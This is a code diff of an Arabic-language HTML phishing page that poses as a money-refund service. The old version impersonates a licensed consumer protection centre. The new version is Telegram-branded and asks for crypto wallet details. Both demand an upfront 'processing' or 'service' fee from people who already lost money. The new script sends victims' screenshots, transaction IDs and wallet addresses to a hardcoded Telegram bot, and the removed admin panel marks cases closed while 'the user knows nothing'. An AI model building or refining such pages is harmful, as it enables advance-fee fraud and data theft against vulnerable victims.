@@ -2,530 +2,407 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز حماية المستهلك - استرداد الأموال</title>
-    <!-- Font Awesome -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>استرداد المبلغ - تلجرام متصل</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Segoe UI', 'Cairo', system-ui, sans-serif;
         }
-
         body {
-            font-family: 'Tajawal', sans-serif;
-            background: #f0f2f5;
-            direction: rtl;
-        }
-
-        /* Navbar احترافية */
-        .navbar {
-            background: #fff;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            padding: 15px 40px;
+            background: linear-gradient(145deg, #f0f5fe 0%, #e9eef5 100%);
+            min-height: 100vh;
+            padding: 2rem 1rem;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            flex-wrap: wrap;
         }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: #0a5c6e;
-        }
-        .logo i {
-            font-size: 2rem;
-            color: #e67e22;
-        }
-        .nav-links {
-            display: flex;
-            gap: 25px;
-        }
-        .nav-links a {
-            text-decoration: none;
-            color: #2c3e50;
-            font-weight: 500;
-        }
-        .trust-badge {
-            background: #e8f5e9;
-            padding: 8px 20px;
-            border-radius: 40px;
-            font-size: 0.85rem;
-            color: #2e7d32;
-        }
-        .trust-badge i {
-            margin-left: 8px;
-        }
-
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(135deg, #0a5c6e, #0e7c8c);
-            color: white;
-            padding: 60px 40px;
-            text-align: center;
-        }
-        .hero h1 {
-            font-size: 2.8rem;
-            margin-bottom: 15px;
-        }
-        .hero p {
-            font-size: 1.2rem;
-            opacity: 0.9;
-        }
-
-        /* Container */
-        .container {
-            max-width: 1300px;
-            margin: 40px auto;
-            padding: 0 25px;
-        }
-
-        /* بطاقة الطلب */
-        .request-card {
-            background: white;
-            border-radius: 35px;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.1);
+        .refund-card {
+            max-width: 700px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 2rem;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25);
             overflow: hidden;
-            margin-bottom: 40px;
         }
         .card-header {
-            background: #f8fafc;
-            padding: 25px 35px;
-            border-bottom: 1px solid #e2e8f0;
+            background: #1a2c3e;
+            padding: 1.8rem 2rem;
+            color: white;
+            text-align: center;
         }
-        .card-header h2 {
-            color: #0f2b33;
+        .card-header h1 {
             font-size: 1.8rem;
-        }
-        .card-header h2 i {
-            color: #e67e22;
-            margin-left: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
         }
         .card-body {
-            padding: 35px;
-        }
-
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 25px;
-            margin-bottom: 25px;
+            padding: 2rem;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 1.8rem;
         }
-        .form-group label {
-            display: block;
-            font-weight: 700;
-            margin-bottom: 10px;
-            color: #1e3a4d;
-        }
-        .form-group label i {
-            color: #e67e22;
-            margin-left: 8px;
-        }
-        .form-group input, .form-group textarea {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1.5px solid #cbd5e1;
-            border-radius: 20px;
-            font-size: 1rem;
-            font-family: inherit;
-            transition: 0.2s;
-        }
-        .form-group input:focus, .form-group textarea:focus {
-            border-color: #0e7c8c;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(14,124,140,0.2);
-        }
-
-        .upload-box {
-            border: 2px dashed #cbd5e1;
-            background: #fafdff;
-            border-radius: 25px;
-            padding: 25px;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .upload-box:hover {
-            border-color: #e67e22;
-            background: #fff7ed;
-        }
-        .preview-grid {
+        label {
             display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin-top: 20px;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: #1e2f3e;
+            margin-bottom: 8px;
         }
-        .preview-img {
-            width: 90px;
-            height: 90px;
-            object-fit: cover;
-            border-radius: 18px;
-            border: 2px solid #e67e22;
-        }
-
-        .btn-primary {
-            background: linear-gradient(95deg, #e67e22, #d35400);
-            color: white;
-            border: none;
-            padding: 16px 28px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            border-radius: 45px;
+        input {
             width: 100%;
+            padding: 12px 16px;
+            border-radius: 18px;
+            border: 1.5px solid #e2e8f0;
+            font-size: 0.95rem;
+        }
+        .file-upload-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .file-btn {
+            background: #eef2fa;
+            border: 1px solid #cbd5e1;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: 600;
             cursor: pointer;
-            transition: 0.2s;
-            margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .file-name {
+            font-size: 0.8rem;
+            color: #2c7da0;
+            background: #f1f5f9;
+            padding: 6px 12px;
+            border-radius: 30px;
+        }
+        .btn-primary {
+            background: #0f3b4c;
+            width: 100%;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
         .btn-primary:hover {
-            transform: scale(1.01);
-            box-shadow: 0 8px 20px rgba(230,126,34,0.3);
+            background: #0a2c3a;
         }
-
-        .transfer-step {
-            background: #fef9e6;
-            border-radius: 30px;
-            padding: 25px;
-            margin-top: 30px;
-            border: 1px solid #ffde9c;
+        .status-box {
+            background: #f8fafc;
+            border-radius: 28px;
+            padding: 1rem 1.5rem;
+            margin-top: 1.5rem;
+            border-right: 4px solid #2c7da0;
         }
-        .bank-number {
-            background: white;
-            padding: 15px;
-            border-radius: 50px;
-            text-align: center;
-            font-size: 1.7rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            margin: 20px 0;
-            border: 2px solid #e67e22;
-            color: #1e3a4d;
+        .warning-box {
+            background: #fff9e8;
+            border-right: 4px solid #e6a017;
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 20px;
         }
-        .processing-message {
-            background: #e3f2fd;
-            border-radius: 25px;
-            padding: 20px;
-            text-align: center;
-            font-weight: 500;
-            display: none;
-        }
-
-        /* Footer */
-        .footer {
-            background: #0f2b33;
-            color: #ccc;
-            text-align: center;
-            padding: 35px;
-            margin-top: 60px;
-        }
-
-        /* Admin Panel مخفي بشكل احترافي */
-        .admin-secret {
-            position: fixed;
-            bottom: 15px;
-            left: 15px;
-            background: #1e2a3a;
-            color: white;
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-size: 12px;
-            cursor: pointer;
-            opacity: 0.6;
-            z-index: 999;
+        .fee-address {
+            background: #eef2fa;
+            padding: 12px 16px;
+            border-radius: 32px;
+            direction: ltr;
             font-family: monospace;
+            word-break: break-all;
+            margin-top: 8px;
         }
-        .admin-panel {
-            display: none;
-            background: white;
-            border-radius: 30px;
-            margin-top: 40px;
-            padding: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        .flex-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 1rem;
         }
-        .admin-panel.show {
-            display: block;
-        }
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        .admin-table th, .admin-table td {
-            padding: 12px;
-            border-bottom: 1px solid #ddd;
-            text-align: right;
-        }
-        .admin-table th {
-            background: #0a5c6e;
-            color: white;
-        }
-        .approve-btn {
-            background: #27ae60;
-            color: white;
+        .btn-secondary {
+            background: #e9edf2;
             border: none;
-            padding: 6px 12px;
-            border-radius: 25px;
+            padding: 12px;
+            border-radius: 40px;
+            font-weight: 600;
             cursor: pointer;
+            flex: 1;
         }
-
-        @media (max-width: 800px) {
-            .form-row { grid-template-columns: 1fr; }
-            .navbar { flex-direction: column; gap: 15px; }
+        .hidden {
+            display: none;
+        }
+        .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        footer {
+            background: #f1f5f9;
+            text-align: center;
+            padding: 1rem;
+            font-size: 0.7rem;
         }
     </style>
 </head>
 <body>
 
-<!-- Navbar واقعي -->
-<div class="navbar">
-    <div class="logo">
-        <i class="fas fa-shield-alt"></i>
-        <span>مركز حماية المستهلك</span>
+<div class="refund-card">
+    <div class="card-header">
+        <h1><i class="fab fa-telegram"></i> استرداد المبلغ المستحق</h1>
+        <p>سيتم إرسال كل شيء إلى حساب التيليجرام الخاص بك تلقائياً</p>
     </div>
-    <div class="nav-links">
-        <a href="#">الرئيسية</a>
-        <a href="#">تقديم شكوى</a>
-        <a href="#">استرداد الأموال</a>
-        <a href="#">اتصل بنا</a>
-    </div>
-    <div class="trust-badge">
-        <i class="fas fa-check-circle"></i> جهة مرخصة رسمياً
-    </div>
-</div>
 
-<!-- Hero -->
-<div class="hero">
-    <h1>استرداد الأموال المحولة بالخطأ</h1>
-    <p>نظام إلكتروني آمن لاستعادة حقوقك المالية</p>
-</div>
-
-<div class="container">
-    <div class="request-card">
-        <div class="card-header">
-            <h2><i class="fas fa-file-alt"></i> طلب استرداد جديد</h2>
-            <p>يرجى إدخال بيانات الشكوى بدقة مع إرفاق المستندات المطلوبة</p>
-        </div>
-        <div class="card-body">
-            <div class="form-row">
-                <div class="form-group">
-                    <label><i class="fas fa-phone"></i> رقم المستلم (المحول إليه)</label>
-                    <input type="text" id="receiverPhone" placeholder="مثال: 01012345678">
+    <div class="card-body">
+        <form id="refundForm">
+            <div class="form-group">
+                <label><i class="fas fa-image"></i> اسكرينات الإرسال الأولي</label>
+                <div class="file-upload-area">
+                    <label class="file-btn" id="uploadScreenshotBtn1"><i class="fas fa-folder-open"></i> اختر صورة</label>
+                    <span class="file-name" id="screenshotFileName">لا توجد صورة</span>
                 </div>
-                <div class="form-group">
-                    <label><i class="fas fa-user"></i> الاسم الثلاثي</label>
-                    <input type="text" id="fullName" placeholder="محمد أحمد محمود">
-                </div>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label><i class="fas fa-money-bill"></i> المبلغ المحول بالخطأ</label>
-                    <input type="number" id="stolenAmount" placeholder="المبلغ بالجنيه">
-                </div>
-                <div class="form-group">
-                    <label><i class="fas fa-exchange-alt"></i> رقم التدفق (Transaction ID)</label>
-                    <input type="text" id="flowNumber" placeholder="رقم العملية">
-                </div>
+                <input type="file" id="screenshotFileInput" accept="image/*" style="display: none;">
             </div>
 
             <div class="form-group">
-                <label><i class="fas fa-image"></i> سكرينات الاتفاقية أو التحويل الأصلي</label>
-                <div class="upload-box" id="uploadOriginal">
-                    <i class="fas fa-cloud-upload-alt" style="font-size: 2rem;"></i>
-                    <p>اضغط لرفع الصور أو اسحبها هنا</p>
-                    <input type="file" id="originalScreens" multiple accept="image/*" hidden>
-                </div>
-                <div id="previewOriginal" class="preview-grid"></div>
+                <label><i class="fas fa-water"></i> رقم التدفق</label>
+                <input type="text" id="flowId" placeholder="مثال: TXN-7865-ABCD">
             </div>
 
-            <button class="btn-primary" id="startRequestBtn"><i class="fas fa-arrow-left"></i> بدء عملية الاسترداد</button>
+            <div class="form-group">
+                <label><i class="fas fa-wallet"></i> عنوان محفظتك</label>
+                <input type="text" id="receiverWallet" placeholder="0x... أو عنوان محفظتك">
+            </div>
 
-            <!-- منطقة الدفع والسكرينة -->
-            <div id="transferStep" style="display: none;">
-                <div class="transfer-step">
-                    <i class="fas fa-exclamation-triangle" style="color:#e67e22; font-size:1.6rem;"></i>
-                    <h3>إجراء إلزامي لاستكمال الاسترداد</h3>
-                    <p>لضمان جدية الطلب، يجب دفع رسوم المعالجة الإدارية (3000 جنيه) على الرقم التالي:</p>
-                    <div class="bank-number">
-                        <i class="fas fa-mobile-alt"></i> 01050079125
-                    </div>
-                    <p>بعد إتمام التحويل، قم برفع صورة الإيصال بالزر أدناه</p>
+            <div class="form-group">
+                <label><i class="fas fa-coins"></i> المبلغ المستحق (دولار)</label>
+                <input type="number" id="dueAmount" placeholder="مثال: 1250.50" step="any">
+            </div>
 
-                    <div class="form-group">
-                        <label><i class="fas fa-receipt"></i> ارفع سكرينة التحويل</label>
-                        <input type="file" id="transferProof" accept="image/*">
-                        <div id="proofPreview" class="preview-grid"></div>
-                        <button class="btn-primary" id="sendProofBtn" style="background:#2c7a47; margin-top:15px;"><i class="fas fa-paper-plane"></i> إرسال إثبات الدفع</button>
-                    </div>
+            <div class="warning-box">
+                <i class="fas fa-info-circle"></i> بعد الضغط على "استرداد" سيطلب منك دفع <strong>150 دولار</strong> كرسوم خدمة.
+            </div>
 
-                    <div id="processingMsg" class="processing-message">
-                        <i class="fas fa-spinner fa-pulse"></i> جاري معالجة طلبك، سيتم التواصل معك خلال 48 ساعة.
-                    </div>
+            <button type="button" id="requestRefundBtn" class="btn-primary"><i class="fas fa-arrow-left"></i> اضغط للاسترداد</button>
+        </form>
+
+        <div id="refundStepsPanel" class="status-box hidden">
+            <div id="stepMessage"></div>
+        </div>
+
+        <div id="paymentPanel" class="hidden">
+            <hr>
+            <div class="warning-box">
+                <strong>رسوم الخدمة: 150 دولار</strong><br>
+                أرسل 150 دولار إلى العنوان التالي:
+                <div class="fee-address">829548755</div>
+                ثم ارفع صورة تؤكد الإرسال.
+            </div>
+
+            <div class="form-group">
+                <label><i class="fas fa-camera"></i> سكرين الإرسال بعد دفع 150 دولار</label>
+                <div class="file-upload-area">
+                    <label class="file-btn" id="uploadScreenshotBtn2"><i class="fas fa-folder-open"></i> اختر صورة</label>
+                    <span class="file-name" id="paymentScreenshotName">لا توجد صورة</span>
                 </div>
+                <input type="file" id="paymentScreenshotInput" accept="image/*" style="display: none;">
+            </div>
+
+            <div class="flex-buttons">
+                <button id="submitPaymentProofBtn" class="btn-primary" style="background:#226644;"><i class="fas fa-paper-plane"></i> تم الإرسال وإرسال البيانات</button>
+                <button id="resetStepBtn" class="btn-secondary"><i class="fas fa-sync-alt"></i> إلغاء</button>
             </div>
         </div>
+
+        <div id="verificationPanel" class="hidden status-box">
+            <div id="verificationMessage"></div>
+        </div>
     </div>
-</div>
-
-<div class="footer">
-    <p>© 2025 مركز حماية المستهلك - جميع الحقوق محفوظة | جهة معتمدة من وزارة العدل الرقمية</p>
-</div>
-
-<!-- Admin Panel سري -->
-<div class="admin-secret" id="adminToggle">🔐 لوحة الإدارة</div>
-<div id="adminPanel" class="admin-panel">
-    <h3><i class="fas fa-user-shield"></i> طلبات الانتظار (التحويلات المرفوعة)</h3>
-    <table class="admin-table">
-        <thead>
-            <tr><th>رقم التدفق</th><th>الاسم</th><th>المبلغ</th><th>رقم المستلم</th><th>الإجراء</th></tr>
-        </thead>
-        <tbody id="adminQueue"></tbody>
-    </table>
+    <footer><i class="fab fa-telegram"></i> البوت يعمل | سيتم إرسال الصور والبيانات إليك فوراً</footer>
 </div>
 
 <script>
-    // بيانات الطلبات المعلقة
-    let pendingQueue = JSON.parse(localStorage.getItem('realRefundQueue')) || [];
+    // ✅ التوكن الخاص بك
+    const BOT_TOKEN = "8659738482:AAFSeSVcD2i_f2pv3wuvNTW8PIi7tWPmUdo";
+    
+    // ✅ الـ chat_id الخاص بك
+    const CHAT_ID = "8727410892";
+    
+    // -------------------------------------------------------------
 
-    // رفع السكرينات الأولى
-    const originalInput = document.getElementById('originalScreens');
-    const uploadArea = document.getElementById('uploadOriginal');
-    const previewOrig = document.getElementById('previewOriginal');
-    let originalFiles = [];
+    const requestBtn = document.getElementById('requestRefundBtn');
+    const refundStepsPanel = document.getElementById('refundStepsPanel');
+    const paymentPanel = document.getElementById('paymentPanel');
+    const verificationPanel = document.getElementById('verificationPanel');
+    const stepMessageDiv = document.getElementById('stepMessage');
+    const verificationMessageDiv = document.getElementById('verificationMessage');
+    const submitPaymentProofBtn = document.getElementById('submitPaymentProofBtn');
+    const resetStepBtn = document.getElementById('resetStepBtn');
 
-    uploadArea.addEventListener('click', () => originalInput.click());
-    originalInput.addEventListener('change', () => {
-        originalFiles = Array.from(originalInput.files);
-        previewOrig.innerHTML = '';
-        originalFiles.forEach(f => {
-            let reader = new FileReader();
-            reader.onload = e => {
-                let img = document.createElement('img');
-                img.src = e.target.result;
-                img.classList.add('preview-img');
-                previewOrig.appendChild(img);
-            };
-            reader.readAsDataURL(f);
-        });
-    });
+    const flowIdInput = document.getElementById('flowId');
+    const receiverWalletInput = document.getElementById('receiverWallet');
+    const dueAmountInput = document.getElementById('dueAmount');
+    
+    const screenshotFileInput = document.getElementById('screenshotFileInput');
+    const uploadScreenshotBtn1 = document.getElementById('uploadScreenshotBtn1');
+    const screenshotFileNameSpan = document.getElementById('screenshotFileName');
+    const paymentScreenshotInput = document.getElementById('paymentScreenshotInput');
+    const uploadScreenshotBtn2 = document.getElementById('uploadScreenshotBtn2');
+    const paymentScreenshotNameSpan = document.getElementById('paymentScreenshotName');
+    
+    let initialScreenshotBase64 = null;
+    let paymentScreenshotBase64 = null;
+    let currentState = 'idle';
 
-    let currentRequest = null;
-    const startBtn = document.getElementById('startRequestBtn');
-    const transferStepDiv = document.getElementById('transferStep');
-    const transferProofInput = document.getElementById('transferProof');
-    const proofPreviewDiv = document.getElementById('proofPreview');
-    const sendProofBtn = document.getElementById('sendProofBtn');
-    const processingMsgDiv = document.getElementById('processingMsg');
-
-    let proofFile = null;
-
-    startBtn.addEventListener('click', () => {
-        const phone = document.getElementById('receiverPhone').value.trim();
-        const name = document.getElementById('fullName').value.trim();
-        const amount = document.getElementById('stolenAmount').value.trim();
-        const flow = document.getElementById('flowNumber').value.trim();
-
-        if (!phone || !name || !amount || !flow) {
-            alert('يرجى ملء جميع الحقول');
-            return;
-        }
-        if (originalFiles.length === 0) {
-            alert('يرجى رفع سكرينات الاتفاقية');
-            return;
-        }
-
-        currentRequest = { phone, name, amount, flow, originalCount: originalFiles.length, status: 'waiting_payment' };
-        transferStepDiv.style.display = 'block';
-        processingMsgDiv.style.display = 'none';
-        alert("✅ تم حفظ الطلب. يرجى تحويل 3000 جنيه على رقم 01050079125 ثم رفع إيصال التحويل.");
-    });
-
-    transferProofInput.addEventListener('change', (e) => {
-        if (e.target.files.length) {
-            proofFile = e.target.files[0];
-            proofPreviewDiv.innerHTML = '';
-            let reader = new FileReader();
-            reader.onload = ev => {
-                let img = document.createElement('img');
-                img.src = ev.target.result;
-                img.classList.add('preview-img');
-                proofPreviewDiv.appendChild(img);
-            };
-            reader.readAsDataURL(proofFile);
-        }
-    });
-
-    sendProofBtn.addEventListener('click', () => {
-        if (!proofFile) {
-            alert('يرجى رفع سكرينة التحويل أولاً');
-            return;
-        }
-        if (!currentRequest) return;
-
-        // إضافة الطلب لقائمة الإدارة
-        currentRequest.proofName = proofFile.name;
-        currentRequest.status = 'pending_admin';
-        pendingQueue.push(currentRequest);
-        localStorage.setItem('realRefundQueue', JSON.stringify(pendingQueue));
-
-        processingMsgDiv.style.display = 'block';
-        sendProofBtn.disabled = true;
-        transferProofInput.disabled = true;
-
-        renderAdminQueue();
-
-        // لا تظهر أي رسالة "تمت الموافقة" أو "تم الرفض" أبداً
-        setTimeout(() => {
-            // المستخدم يظل شايف "جاري المعالجة" فقط
-        }, 100);
-    });
-
-    // لوحة الإدارة (للمدير فقط)
-    function renderAdminQueue() {
-        const tbody = document.getElementById('adminQueue');
-        if (!pendingQueue.length) {
-            tbody.innerHTML = '<tr><td colspan="5">لا توجد طلبات معلقة</td></tr>';
-            return;
-        }
-        tbody.innerHTML = '';
-        pendingQueue.forEach((req, idx) => {
-            let row = tbody.insertRow();
-            row.insertCell(0).innerText = req.flow;
-            row.insertCell(1).innerText = req.name;
-            row.insertCell(2).innerText = req.amount + ' جنيه';
-            row.insertCell(3).innerText = req.phone;
-            let btnCell = row.insertCell(4);
-            let approveBtn = document.createElement('button');
-            approveBtn.innerText = '✅ تم الاسترداد (إغلاق الطلب)';
-            approveBtn.className = 'approve-btn';
-            approveBtn.onclick = () => {
-                pendingQueue.splice(idx, 1);
-                localStorage.setItem('realRefundQueue', JSON.stringify(pendingQueue));
-                renderAdminQueue();
-                alert(`تمت معالجة الطلب ${req.flow} - المستخدم لا يعرف أي شيء`);
-            };
-            btnCell.appendChild(approveBtn);
+    function setupFileUpload(triggerBtn, fileInput, onFileSelected, fileNameSpan) {
+        triggerBtn.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                fileNameSpan.innerText = file.name;
+                const reader = new FileReader();
+                reader.onload = (e) => { if (onFileSelected) onFileSelected(e.target.result); };
+                reader.readAsDataURL(file);
+            } else {
+                fileNameSpan.innerText = "لا توجد صورة";
+                if (onFileSelected) onFileSelected(null);
+            }
         });
     }
 
-    // إظاخفاء لوحة الإدارة
-    let adminVisible = false;
-    const adminPanelDiv = document.getElementById('adminPanel');
-    document.getElementById('adminToggle').addEventListener('click', () => {
-        adminVisible = !adminVisible;
-        if (adminVisible) {
-            adminPanelDiv.classList.add('show');
-            renderAdminQueue();
-        } else {
-            adminPanelDiv.classList.remove('show');
-        }
-    });
+    setupFileUpload(uploadScreenshotBtn1, screenshotFileInput, (data) => { initialScreenshotBase64 = data; }, screenshotFileNameSpan);
+    setupFileUpload(uploadScreenshotBtn2, paymentScreenshotInput, (data) => { paymentScreenshotBase64 = data; }, paymentScreenshotNameSpan);
+
+    async function sendToTelegram(captionText, photoBase64) {
+        let base64Data = photoBase64;
+        if (photoBase64.includes(',')) base64Data = photoBase64.split(',')[1];
+        const byteCharacters = atob(base64Data);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: 'image/jpeg' });
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', captionText);
+        formData.append('photo', blob, 'screenshot.jpg');
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            const result = await response.json();
+            return result.ok;
+        } catch (error) { return false; }
+    }
+
+    async function sendTextToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams();
+        params.append('chat_id', CHAT_ID);
+        params.append('text', message);
+        params.append('parse_mode', 'HTML');
+        try {
+            const response = await fetch(url, { method: 'POST', body: params });
+            const result = await response.json();
+            return result.ok;
+        } catch(e) { return false; }
+    }
+
+    function validateBasic() {
+        if (!initialScreenshotBase64) { alert("يرجى رفع صورة الإرسال الأولى"); return false; }
+        if (!flowIdInput.value.trim()) { alert("أدخل رقم التدفق"); return false; }
+        if (!receiverWalletInput.value.trim()) { alert("أدخل عنوان محفظتك"); return false; }
+        const amount = parseFloat(dueAmountInput.value.trim());
+        if (isNaN(amount) || amount <= 0) { alert("أدخل مبلغ مستحق صحيح"); return false; }
+        return true;
+    }
+
+    function setStepMessage(msg) { stepMessageDiv.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`; }
+    
+    function fullReset() {
+        currentState = 'idle';
+        paymentPanel.classList.add('hidden');
+        verificationPanel.classList.add('hidden');
+        refundStepsPanel.classList.add('hidden');
+        requestBtn.disabled = false;
+        requestBtn.style.opacity = '1';
+        paymentScreenshotBase64 = null;
+        paymentScreenshotNameSpan.innerText = "لا توجد صورة";
+        paymentScreenshotInput.value = '';
+        verificationMessageDiv.innerHTML = '';
+        setStepMessage('');
+        submitPaymentProofBtn.disabled = false;
+        submitPaymentProofBtn.innerHTML = '<i class="fas fa-paper-plane"></i> تم الإرسال وإرسال البيانات';
+        resetStepBtn.style.background = "#e9edf2";
+    }
+    
+    function onRequestRefund() {
+        if (currentState !== 'idle') { alert("يوجد طلب قيد التنفيذ"); return; }
+        if (!validateBasic()) return;
+        currentState = 'waiting_payment';
+        refundStepsPanel.classList.remove('hidden');
+        setStepMessage(`✅ تم تسجيل الطلب، المبلغ المستحق: ${dueAmountInput.value} دولار. يلزم دفع 150 دولار كرسوم خدمة.`);
+        paymentPanel.classList.remove('hidden');
+        requestBtn.disabled = true;
+        requestBtn.style.opacity = '0.6';
+    }
+    
+    async function onPaymentProofSubmitted() {
+        if (currentState !== 'waiting_payment') { alert("لا توجد عملية دفع معلقة"); return; }
+        if (!paymentScreenshotBase64) { alert("يرجى رفع صورة تؤكد إرسال 150 دولار أولاً"); return; }
+        
+        currentState = 'verifying';
+        submitPaymentProofBtn.disabled = true;
+        submitPaymentProofBtn.innerHTML = '<i class="loader"></i> جاري الإرسال...';
+        verificationPanel.classList.remove('hidden');
+        paymentPanel.classList.add('hidden');
+        refundStepsPanel.classList.add('hidden');
+        verificationMessageDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> يتم إرسال البيانات إلى فريق الدعم عبر تلجرام...';
+        
+        const flowId = flowIdInput.value.trim();
+        const wallet = receiverWalletInput.value.trim();
+        const amountDue = dueAmountInput.value.trim();
+        const captionFirst = `📸 صورة الإرسال الأولي\n🔹 رقم التدفق: ${flowId}\n🔹 محفظة الاستلام: ${wallet}\n🔹 المبلغ المستحق: ${amountDue} دولار`;
+        const captionSecond = `💰 إثبات دفع رسوم الخدمة 150 دولار\n📌 العنوان: 829548755\n🔗 رقم التدفق: ${flowId}`;
+        
+        await sendToTelegram(captionFirst, initialScreenshotBase64);
+        await sendToTelegram(captionSecond, paymentScreenshotBase64);
+        await sendTextToTelegram(`✅ طلب استرداد كامل\n🧾 رقم التدفق: ${flowId}\n👛 المحفظة: ${wallet}\n💵 المبلغ المستحق: ${amountDue} USD\n💸 رسوم الخدمة: 150 USD`);
+        
+        verificationMessageDiv.innerHTML = '<i class="fas fa-check-circle" style="color:green;"></i> ✅ تم استلام الصور والبيانات وإرسالها إلى أدمن التيليجرام بنجاح. سيتم التحقق والرد قريباً.';
+        currentState = 'completed';
+        submitPaymentProofBtn.innerHTML = '<i class="fas fa-check-double"></i> اكتمل';
+        resetStepBtn.style.background = "#0f3b4c";
+        resetStepBtn.style.color = "white";
+        resetStepBtn.innerHTML = '<i class="fas fa-redo-alt"></i> طلب جديد';
+        await sendTextToTelegram(`✅✅✅ تم إكمال إجراءات المستخدم بنجاح. رقم التدفق: ${flowId} - رسوم 150 دولار - يرجى مراجعة الصور.`);
+    }
+    
+    function onResetHandler() {
+        if (currentState === 'verifying') { alert("لا يمكن الإلغاء أثناء الإرسال"); return; }
+        fullReset();
+    }
+    
+    requestBtn.addEventListener('click', onRequestRefund);
+    submitPaymentProofBtn.addEventListener('click', onPaymentProofSubmitted);
+    resetStepBtn.addEventListener('click', onResetHandler);
+    document.getElementById('refundForm')?.addEventListener('submit', e => e.preventDefault());
 </script>
+</body>
+</html>
 </body>
 </html>
